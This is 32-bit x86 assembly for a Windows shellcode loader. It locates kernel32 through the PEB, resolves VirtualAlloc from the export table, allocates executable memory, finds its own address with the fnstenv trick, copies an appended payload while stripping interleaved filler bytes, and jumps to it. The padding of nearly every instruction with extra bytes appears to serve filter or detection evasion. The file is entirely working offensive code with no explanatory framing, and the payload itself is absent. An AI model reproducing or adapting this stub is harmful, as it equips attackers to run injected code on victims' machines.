BITS 32
db 0x05
xor ebx, ebx
db 0x90
db 0xa8
db 0x05
mov bl, 0x30
db 0x90
db 0xa8
db 0x05
mov ebx, [fs:ebx]            
db 0xa8
db 0x05
mov ebx, [ebx + 0x0C]        
db 0xa8
db 0x05
mov ebx, [ebx + 0x1C]        
db 0xa8
db 0x05
push 0
mov ecx, '.DLL'
db 0x90
db 0xa8
db 0x05
mov cl, 0x2e
db 0x90
db 0xa8
db 0x05
mov ch, 0x44
push ecx
db 0xa8
db 0x05
db 0x90
db 0x90
mov ecx, 'EL32'
db 0x90
db 0xa8
db 0x05
mov cl, 0x45
db 0x90
db 0xa8
db 0x05
mov ch, 0x4c
push ecx
db 0xa8
db 0x05
db 0x90
db 0x90
mov ecx, 'KERN'
db 0x90
db 0xa8
db 0x05
mov cl, 0x4b
db 0x90
db 0xa8
db 0x05
mov ch, 0x45
push ecx
db 0xa8
db 0x05
NextModule:    push 14
    pop ecx
db 0xa8
db 0x05
    mov edi, esp                 
    dec edi
db 0xa8
db 0x05
    mov ebp, [ebx + 0x08]        
db 0xa8
db 0x05
    mov esi, [ebx + 0x20]        
db 0xa8
db 0x05
    mov ebx, [ebx]               
    isCharEqual:        inc edi
db 0xa8
db 0x05
        dec ecx
            jecxz GetFuncOrd     
db 0xa8
db 0x05
        xor eax, eax
db 0x90
db 0xa8
db 0x05
        lodsw
db 0x90
db 0xa8
db 0x05
        cmp al, 0x61
db 0x9c
db 0xa8
db 0x05
db 0x9d
        jl SHORT isUpper
db 0xa8
db 0x05
            sub al, 0x20
db 0x90
db 0xa8
db 0x05
        isUpper:        cmp al, [edi]
db 0x9c
db 0xa8
db 0x05
db 0x9d
        je SHORT isCharEqual
db 0xa8
db 0x05
    jmp SHORT NextModule
db 0x90
db 0xa8
db 0x05
GetFuncOrd:    push 0
    mov ecx, 'lloc'
db 0x90
db 0xa8
db 0x05
mov cl, 0x6c
db 0x90
db 0xa8
db 0x05
mov ch, 0x6c
    push ecx
db 0xa8
db 0x05
db 0x90
db 0x90
    mov ecx, 'ualA'
db 0x90
db 0xa8
db 0x05
mov cl, 0x75
db 0x90
db 0xa8
db 0x05
mov ch, 0x61
    push ecx
db 0xa8
db 0x05
db 0x90
db 0x90
    mov ecx, 'Virt'
db 0x90
db 0xa8
db 0x05
mov cl, 0x56
db 0x90
db 0xa8
db 0x05
mov ch, 0x69
    push ecx
db 0xa8
db 0x05
    mov ebx, ebp            
db 0x90
db 0xa8
db 0x05
    add ebp, 0x3c           
db 0xa8
db 0x05
    mov ebp, [ebp]          
db 0xa8
db 0x05
    add ebp, ebx            
db 0x90
db 0xa8
db 0x05
    add ebp, 0x78           
db 0xa8
db 0x05
    mov ebp, [ebp]          
db 0xa8
db 0x05
    add ebp, ebx            
db 0x90
db 0xa8
db 0x05
    mov eax, [ebp + 0x20]   
db 0xa8
db 0x05
    add eax, ebx            
db 0x90
db 0xa8
db 0x05
    xor edx, edx
db 0x90
db 0xa8
db 0x05
    NextFunc:        mov edi, esp            
db 0x90
db 0xa8
db 0x05
        push 13
        pop ecx                 
db 0xa8
db 0x05
        mov esi, [eax + edx]
db 0xa8
db 0x05
        add esi, ebx
db 0x90
db 0xa8
db 0x05
        repe cmpsb              
db 0x90
db 0xa8
db 0x05
            jecxz GetFuncAddr 
db 0x90
db 0xa8
db 0x05
        add edx, 4
db 0xa8
db 0x05
        jmp SHORT NextFunc
db 0x90
db 0xa8
db 0x05
GetFuncAddr:    mov edi, [ebp + 0x24]   
db 0xa8
db 0x05
    add edi, ebx            
db 0x90
db 0xa8
db 0x05
    shr edx, 1
db 0x90
db 0xa8
db 0x05
    add edi, edx            
db 0x90
db 0xa8
db 0x05
    xor edx, edx
db 0x90
db 0xa8
db 0x05
    mov dx, [edi]           
db 0xa8
db 0x05
    mov edi, [ebp + 0x1c]   
db 0xa8
db 0x05
    add edi, ebx            
db 0x90
db 0xa8
db 0x05
    shl edx, 2
db 0xa8
db 0x05
    add edi, edx            
db 0x90
db 0xa8
db 0x05
    mov edi, [edi]          
db 0x90
db 0xa8
db 0x05
    add edi, ebx            
db 0x90
db 0xa8
db 0x05
CallVirtualAlloc:    push 0x40               
db 0x90
db 0xa8
db 0x05
    xor eax, eax
db 0x90
db 0xa8
db 0x05
    mov ah, 0x30
    push eax                
db 0xa8
db 0x05
    mov ah, 0x10
    push eax                
db 0xa8
db 0x05
    push 0
db 0x90
db 0xa8
db 0x05
    call edi                
db 0x90
db 0xa8
db 0x05
    xor ecx, ecx            
db 0x90
db 0xa8
db 0x05
    mov ch, (345 >> 8) & 0xff
db 0x90
db 0xa8
db 0x05
    mov cl, 345 & 0xff
db 0x90
db 0xa8
db 0x05
GetPC:     fldpi
db 0x90
db 0xa8
db 0x05
    fnstenv [esp]
db 0xa8
db 0x05
    mov esi, esp
db 0x90
db 0xa8
db 0x05
    add esi, 0xc
db 0xa8
db 0x05
    mov esi, [esi]          
db 0x90
db 0xa8
db 0x05
    add esi, (Shellcode - GetPC) 
db 0xa8
db 0x05
    mov edi, eax            
db 0x90
db 0xa8
db 0x05
CopyShellcode:    mov bx, [esi]
db 0xa8
db 0x05
    mov [edi], bx           
db 0xa8
db 0x05
    add esi, 2
db 0xa8
db 0x05
    add edi, 2
db 0xa8
db 0x05
    mov byte bl, [esi]
db 0x90
db 0xa8
db 0x05
    mov [edi], bl           
db 0x90
db 0xa8
db 0x05
    add esi, 3              
db 0xa8
db 0x05
    add edi, 1
db 0xa8
db 0x05
    sub ecx, 3
db 0xa8
db 0x05
    jecxz Jmp2Shellcode     
db 0x90
db 0xa8
db 0x05
    jmp CopyShellcode
db 0x90
db 0xa8
db 0x05
Jmp2Shellcode:    jmp eax                 
db 0x90
db 0xa8
db 0x05
Shellcode:    lea esp, [esp] 
db 0xa8
